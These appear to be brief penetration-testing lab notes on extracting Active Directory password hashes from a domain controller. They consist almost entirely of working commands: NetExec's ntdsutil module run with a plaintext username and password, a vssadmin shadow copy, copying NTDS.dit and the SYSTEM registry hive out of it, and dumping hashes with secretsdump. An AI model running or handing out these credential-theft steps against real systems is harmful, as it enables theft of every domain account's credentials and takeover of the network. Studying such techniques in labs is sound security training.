## NetExec

```shell
netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```

---
## Shadow Copy & VSS 

```PowerShell
C:\> vssadmin CREATE SHADOW /For=C:
### Shadow copy of C: drive

C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
### Copying NTDS.dit from the VSS

C:\WINDOWS\system32> reg.exe save hklm\system C:\NTDS\system
### Copying SYSTEM reg hive
```

```Note
As was the case with `SAM`, the hashes stored in `NTDS.dit` are encrypted with a key stored in `SYSTEM`. In order to successfully extract the hashes, one must download both files.
```
### Extracting hashes

```shell
secretsdump.py -ntds NTDS.dit -system system LOCAL
```

---
